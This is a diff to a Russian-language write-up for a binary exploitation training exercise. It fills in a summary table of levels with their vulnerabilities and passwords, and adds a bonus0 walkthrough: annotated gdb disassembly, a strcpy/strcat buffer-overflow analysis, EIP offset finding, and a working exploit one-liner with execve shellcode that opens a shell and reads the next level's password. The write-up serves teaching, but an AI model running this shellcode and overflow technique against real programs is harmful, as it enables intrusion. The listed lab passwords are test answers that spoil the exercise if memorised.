@@ -45,9 +45,9 @@ bonu0 bonu1 bonu02 bonu3 end
 | [level5](#lvl5)        | <p>уязвимость строки форматирования: уязвимое использование функции printf()<br><br> наличие в коде функции system() | gdb. Подмена адреса функции на адрес с system() | d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31 |
 | [level6](#lvl6)        | <p>использование функции strcpy() без защиты буфера от переполнения, наличие в коде функции system() </p> | <p>Работа со стеком. </p> <br> <p>поиск слабого места: gdb;</p> <p>взлом: переполнение буфера ( `strcpy()` ) и подмена EIP регистра (адрес возврата из функции) на адрес для выполнения system() | f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d |
 | [level7](#lvl7)        | использование функции strcpy() без защиты буфера от переполнения | взлом: переполнение буфера ( `strcpy()` ) и подмена во втором вызове `strcpy()` первого аргумента на адрес функции, которая будет вызвана в дальнейшем в программе, подмена второго аргумента на адрес функции, которую мне надо вызвать | 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 |
-| [level8](#lvl8)        | неаккуратное использование malloc:<br>strdup()<br>strcpy() | gdb, работа с памятью - правильно ввести строки для заполнения памяти в нужных местах | c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a |
-| [level9](#lvl9)        |  |  |  |
-| [bonus0](#bonus0)      |  |  |  |
+| [level8](#lvl8)        | неаккуратное использование malloc:<br>strdup()<br>strcpy() | gdb, работа с памятью - правильно передать в программу аргументы для заполнения памяти в нужных местах | c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a |
+| [level9](#lvl9)        | Использование memcpy() без проверки допустимой длины для копирования. | gdb <br><br> Атака:<br>1. Переполнение буфера и расчет смещения.<br>2. Выбор для исполнения в буфере shellcode.<br>3. Подстановке шеллкода и нужных адресов в переполненный буфер. | f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728 |
+| [bonus0](#bonus0)      | Копирование в буфер строки при недостаточной проверке на переполнение. <br><br>Уязвимые функции:<br>strcpy(fullname, first);<br>strcat(fullname, " ");<br>strcat(fullname, last); | gdb <br><br> Атака:<br>1. Переполнение буфера и расчет смещения.<br>2. Выбор для исполнения в буфере shellcode.<br>3. Подстановке шеллкода и нужных адресов в переполненный буфер. | cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9 |
 | [bonus1](#bonus1)      |  |  |  |
 | [bonus2](#bonus2)      |  |  |  |
 | [bonus3](#bonus3)      |  |  |  |
@@ -4105,10 +4105,255 @@ gdb bonus0
 ```
 ---
 </details>
+<br><br>
+Коротко:
+<details> <summary> main() </summary>
 
-<!-- <details> 
-  <summary>  </summary>
-</details>  -->
+```sh
+(gdb) disassemble main
+# Dump of assembler code for function main:
+# 1. создается стековый фрейм (stack frame) или кадр стека:
+0x080485a4 <+0>:  push %ebp                  # сохраняет в стеке содержимое регистра EBP  
+                                             # esp 0xbffff630, ebp 0x0
+0x080485a5 <+1>:  mov  %esp,%ebp             # присваивает регистру EBP значение ESP      
+                                             # esp и ebp теперь 0xbffff638
+0x080485a7 <+3>:  and  $0xfffffff0,%esp      # выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.      
+                                             # esp теперь 0xbffff630
+0x080485aa <+6>:  sub  $0x40,%esp            # выделяется 40 (hex) = 64 (dec) байт под локальные переменные
+
+# 2. Подготовка и вызов функции pp():
+0x080485ad <+9>:  lea  0x16(%esp),%eax       # получен указатель на буфер (локальная переменная)
+                                             # x/s $eax -> 0xbffff606: ""
+                                             # 64 байта под локальные переменые - 16 (hex)
+                                             # 64 байта под локальные переменые - 22 (dec) = 42 байта
+                                             # буфер не более 42 байт 
+                                             #                 или так можно посчитать:
+                                             # esp 0xbffff630 - буфер 0xbffff606 = 42 байта 
+0x080485b1 <+13>: mov  %eax,(%esp)           # указатель на буфер передан в качестве аргумента
+0x080485b4 <+16>: call 0x804851e <pp>        # вызов pp()
+
+# 3. Подготовка и вызов функции puts():
+0x080485b9 <+21>: lea  0x16(%esp),%eax       # получен указатель на буфер (локальная переменная)
+0x080485bd <+25>: mov  %eax,(%esp)           # указатель на буфер передан в качестве аргумента
+0x080485c0 <+28>: call 0x80483b0 <puts@plt>  # вызов puts()
+
+# 4. Завершение и возврат из main:
+0x080485c5 <+33>: mov  $0x0,%eax             # передано 0 для return(0)
+0x080485ca <+38>: leave
+0x080485cb <+39>: ret  
+# End of assembler dump.
+```
+---
+</details> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; || <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \/ <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; буфер_main[не более 42 байт]; <br>
+<details><summary> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pp( буфер_main ); </summary>
+
+```sh
+(gdb) disassemble pp
+# Dump of assembler code for function pp:
+# 1. создается стековый фрейм (stack frame) или кадр стека:
+0x0804851e <+0>:   push   %ebp                  # сохраняет в стеке содержимое регистра EBP 
+0x0804851f <+1>:   mov    %esp,%ebp             # присваивает регистру EBP значение ESP (0xbffff638)
+0x08048521 <+3>:   push   %edi
+0x08048522 <+4>:   push   %ebx
+0x08048523 <+5>:   sub    $0x50,%esp            # выделяется 50 (hex) = 80 (dec) байт под локальные переменные (0xbffff638 - 50(hex) = 0xbffff5e8)
+
+# 2. Подготовка и вызов функции p():
+0x08048526 <+8>:   movl   $0x80486a0,0x4(%esp)  # строка " - " передана    2м аргументом
+                                                # x 0x80486a0 -> " - "
+0x0804852e <+16>:  lea    -0x30(%ebp),%eax      # получен адрес на локальный буфер (буфер_pp_1)
+                                                # x $eax -> 0xbffff5b8: ""
+0x08048531 <+19>:  mov    %eax,(%esp)           # буфер буфер_pp_1 передан 1м аргументом
+0x08048534 <+22>:  call   0x80484b4 <p>         # вызов p(буфер_pp_1, " - ")
+
+# 3. Подготовка и вызов функции p():
+0x08048539 <+27>:  movl   $0x80486a0,0x4(%esp)  # строка " - " передана    2м аргументом
+0x08048541 <+35>:  lea    -0x1c(%ebp),%eax      # получен адрес на локальный буфер (буфер_pp_2)
+                                                # x $eax -> 0xbffff5cc: ""
+0x08048544 <+38>:  mov    %eax,(%esp)           # буфер буфер_pp_2 передан 1м аргументом
+0x08048547 <+41>:  call   0x80484b4 <p>         # вызов p(буфер_pp_2, " - ")
+
+# 4. Подготовка и вызов функции strcpy():
+0x0804854c <+46>:  lea    -0x30(%ebp),%eax      # получен адрес на локальный буфер (буфер_pp_1)
+0x0804854f <+49>:  mov    %eax,0x4(%esp)        # буфер буфер_pp_1 передан 2м аргументом
+0x08048553 <+53>:  mov    0x8(%ebp),%eax        # x/a $ebp+8 0xbffff5f0 -> 0xbffff606
+                                                # получен адрес буфера из main() (обозначу буфер_main) 
+                                                # в main() обнаружен этот буфер в строке: 0x080485ad <+9>
+0x08048556 <+56>:  mov    %eax,(%esp)           # буфер из main() передан  1м аргументом
+0x08048559 <+59>:  call   0x80483a0 <strcpy@plt> # strcpy(буфер_main, буфер_pp_1)
+
+# 5. Добавление к буферу из main() пробела:
+0x0804855e <+64>:  mov    $0x80486a4,%ebx       # x/s 0x80486a4 -> " "
+0x08048563 <+69>:  mov    0x8(%ebp),%eax        # получен адрес на буфер из main() буфер_main
+0x08048566 <+72>:  movl   $0xffffffff,-0x3c(%ebp) # 0xffffffff положено в -0x3c(%ebp)
+0x0804856d <+79>:  mov    %eax,%edx             # адрес буфер_main помещен в регистр edx
+0x0804856f <+81>:  mov    $0x0,%eax             # 0 положен в eax
+0x08048574 <+86>:  mov    -0x3c(%ebp),%ecx      # 0xffffffff положено в ecx
+0x08048577 <+89>:  mov    %edx,%edi             # адрес буфер_main помещен в регистр edi
+0x08048579 <+91>:  repnz scas %es:(%edi),%al    # запись в буфер из main() строки-пробела " " 
+                                                # x/s 0xbffff606 -> "AAAA "
+0x0804857b <+93>:  mov    %ecx,%eax             
+0x0804857d <+95>:  not    %eax
+0x0804857f <+97>:  sub    $0x1,%eax
+0x08048582 <+100>: add    0x8(%ebp),%eax
+0x08048585 <+103>: movzwl (%ebx),%edx
+0x08048588 <+106>: mov    %dx,(%eax)            
+
+# 6. Подготовка и вызов функции strcat():
+0x0804858b <+109>: lea    -0x1c(%ebp),%eax      # получен указатель на локальный буфер (буфер_pp_2)
+0x0804858e <+112>: mov    %eax,0x4(%esp)        # буфер буфер_pp_2 передан 2м аргументом
+0x08048592 <+116>: mov    0x8(%ebp),%eax        # x/s 0xbffff606 ->  "AAAA "
+0x08048595 <+119>: mov    %eax,(%esp)           # буфер из main() передан  1м аргументом
+0x08048598 <+122>: call   0x8048390 <strcat@plt> # вызов strcat(буфер_main, буфер_pp_2)
+
+# 7. Завершение и возврат из функции :
+0x0804859d <+127>: add    $0x50,%esp
+0x080485a0 <+130>: pop    %ebx
+0x080485a1 <+131>: pop    %edi
+0x080485a2 <+132>: pop    %ebp
+0x080485a3 <+133>: ret    
+End of assembler dump.
+```
+
+</details> 
+</details> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; || <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \/ <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  буфер_pp_1; <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  буфер_pp_2; <br>
+<details><summary> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p( буфер_pp1 или буфер_pp2, " - " ); </summary>
+
+```sh
+(gdb) disassemble p
+# Dump of assembler code for function p:
+# 1. создается стековый фрейм (stack frame) или кадр стека:
+0x080484b4 <+0>:   push %ebp                  # сохраняет в стеке содержимое регистра EBP 
+0x080484b5 <+1>:   mov  %esp,%ebp             # присваивает регистру EBP значение ESP
+0x080484b7 <+3>:   sub  $0x1018,%esp          # выделяется 1018 (hex) = 4120 (dec) байт под локальные переменные
+
+# 2. Подготовка и вызов функции puts():
+0x080484bd <+9>:   mov  0xc(%ebp),%eax        # в eax положена переданная в p() строка " - "
+0x080484c0 <+12>:  mov  %eax,(%esp)           # " - " передана 1м аргументом
+0x080484c3 <+15>:  call 0x80483b0 <puts@plt>  # вызов puts(" - ")
+
+# 3. Подготовка и вызов функции read():
+# ssize_t read(int fd, void *buf, size_t count);
+0x080484c8 <+20>:  movl $0x1000,0x8(%esp)    # размер буфера_p передан 3м аргументом
+                                             # 1000(hex) = 4096(dec)
+0x080484d0 <+28>:  lea  -0x1008(%ebp),%eax   # локальный буфер (назову буфер_p) помещен в eax
+                                             # адрес буфера x $eax -> 0xbfffe580
+0x080484d6 <+34>:  mov  %eax,0x4(%esp)       # буфер_p передан         2м аргументом 
+0x080484da <+38>:  movl $0x0,(%esp)          # 0 передан               1м аргументом
+0x080484e1 <+45>:  call 0x8048380 <read@plt> # вызов read(0, буфер_p, 4096)
+
+# 4. Подготовка и вызов функции strchr():
+0x080484e6 <+50>:  movl $0xa,0x4(%esp)       # a(ASCII) = "\n" передано 2м аргументом
+0x080484ee <+58>:  lea  -0x1008(%ebp),%eax   # буфер_p помещен в eax
+0x080484f4 <+64>:  mov  %eax,(%esp)          # буфер_p передан          1м аргументом
+0x080484f7 <+67>:  call 0x80483d0 <strchr@plt> # вызов strchr(буфер_p, '\n')
+
+# 5. Далее:
+0x080484fc <+72>:  movb $0x0,(%eax)          # по адресу, где был '\n' в буфер_p положен 0
+
+# 6. Подготовка и вызов функции strncpy():
+0x080484ff <+75>:  lea  -0x1008(%ebp),%eax   # буфер_p помещен в eax
+0x08048505 <+81>:  movl $0x14,0x8(%esp)      # 14(hex)=20(dec) передано   3м аргументом
+0x0804850d <+89>:  mov  %eax,0x4(%esp)       # буфер_p передан            2м аргументом
+0x08048511 <+93>:  mov  0x8(%ebp),%eax       # буфер_pp положен в eax
+                                             # буфер_pp1 либо буфер_pp2
+0x08048514 <+96>:  mov  %eax,(%esp)          # буфер_pp передан           1м аргументом
+0x08048517 <+99>:  call 0x80483f0 <strncpy@plt> # вызов strncpy(буфер_pp, buf, 20)
+
+# 7. Завершение и возврат из функции:
+0x0804851c <+104>: leave  
+0x0804851d <+105>: ret    
+# End of assembler dump.
+```
+</details> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; || <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \/ <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; буфер_p[4096]<br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; puts( " - " ) <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; read( 0, буфер_p, 4096 ) <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strchr( буфер_p, '\n' ) <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strncpy( буфер_pp, buf, 20 ) <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strcpy( буфер_main, буфер_pp_1 ); <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; дописан пробел в буфер из main() (буфер_main == "введенная_1й_раз_строка "); <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strcat( буфер_main, буфер_pp_2 ); <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; puts( буфер_main ); <br>
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0; <br>
+
+<br>
+
+Сначала запись идет в `буфер_pp_1`, потом в `буфер_pp_2`.
+
+В `p()` из введенной строки символ `\n` заменяется на `\0`, но если он встретится позже, чем 20й символ, то `\0` не будет записано в `буфер_pp_1`. И тогда `буфер_pp_2` для `strcpy(буфер_main, буфер_pp_1)` будет выглядеть как продолжение `буфер_pp_1`. \
+То есть : `strcpy(буфер_main, буфер_pp_1 и буфер_pp_2)` \
+Это приведет к переполнению буфера:
+
+```
+буфер_main[42]
+буфер_pp_1 40 символов (20 от буфер_pp_1 и 20 от буфер_pp_2)
+пробел      1 символ
+буфер_pp_2 20 символов
+||
+\/
+в буфер размером на 42 байта попытаемся положить 61 = (40 + 1 + 20) байт.
+
+```
+Из написанного выше следует, что если среди записываемых `61 - 42 = 19` байтов встретится адрес `EIP`, то его можно перезаписать.
+
+Поиск `EIP`:
+
+```sh
+(gdb) r
+# Starting program: /home/user/bonus0/bonus0 
+#  - 
+# 1234567890asdfghjklzXXXX
+#  - 
+# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7
+# 1234567890asdfghjklzAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+# 
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x41336141 in ?? ()
+(gdb) info registers eip
+# ||
+# \/               A 3 a A
+# eip            0x41336141       0x41336141
+# 
+#                   Aa3A => смещение 9 (Aa0Aa1Aa2)
+```
+Итого :
+```
+первый ввод:
+"34 байта заполнителя минимум + shellcode" 
+
+второй ввод:
+"9 байт заполнителя перед адресом EIP + 4 байта EIP подмена на адрес буфера с shellcode + 7 байт заполнителя"
+
+```
+Про 34 и 7: \
+Адрес буфера может немного отличаться при запуске бинарного файла в gdb и без gdb, поэтому перед shellcode кладу в буфер мусор или NOP. Опытным путем выяснила, что до кода должно быть не менее 34 символов. Далее в буфер будут положены данные от второго ввода: мусор 9 символов, адрес на начало буфера, любые символы от 7 символов (максимум 34, точное количество зависит от количество символов в начале буфера). \
+И вводя вместо 34 больше символов-заполнителей важно не перестараться, чтобы не переполнить и этот буфер (4096 байт).
+
+Атакую: 
+```sh
+(python -c 'print "\x90" * 34 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; python -c 'print "Aa0Aa1Aa2" + "\xd0\xe5\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
+whoami
+# || 
+# \/
+# bonus1
+cat /home/user/bonus1/.pass
+# || 
+# \/
+# cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+Уровень пройден!
+```sh
+su bonus1
+# Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
+<br>
 
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
